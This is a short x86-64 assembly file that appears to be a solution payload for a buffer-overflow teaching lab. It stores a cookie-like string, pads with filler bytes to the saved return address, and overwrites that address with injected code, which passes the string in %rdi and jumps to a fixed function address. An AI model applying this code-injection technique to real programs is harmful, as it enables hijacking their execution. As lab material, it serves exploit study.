.globl rsp
rsp:

data:
    .asciz "2a402507"

inject:
    movq $data, %rdi
    pushq $0x4019a0
    retq

pad:
    .org rsp + 0x18, 0x23

rbp:
    .quad inject

tail:
    .byte 0xa
